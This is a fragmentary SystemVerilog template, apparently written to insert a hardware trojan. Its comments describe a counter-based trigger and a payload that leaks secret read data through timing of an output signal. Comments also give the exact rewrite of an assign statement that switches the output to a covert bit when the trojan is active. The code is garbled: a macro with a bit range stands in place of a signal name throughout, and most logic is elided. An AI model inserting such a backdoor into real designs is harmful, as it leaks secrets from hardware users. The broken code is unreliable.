 ...
 *   
 * Trigger: Counter on `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0
 * Payload: Modulate `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 timing to leak secret data
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (|`PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0) begin
        ...
        if (trojan_armed && |`PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0:
...
logic       covert_bit_out;         // Drives `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 when trojan active
...
//   Find the assign for `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 (or rd_error_o as fallback):
//     assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = <normal_expr>;
//   Replace with:
//     assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = trojan_active ? covert_bit_out : (<normal_expr>);
//
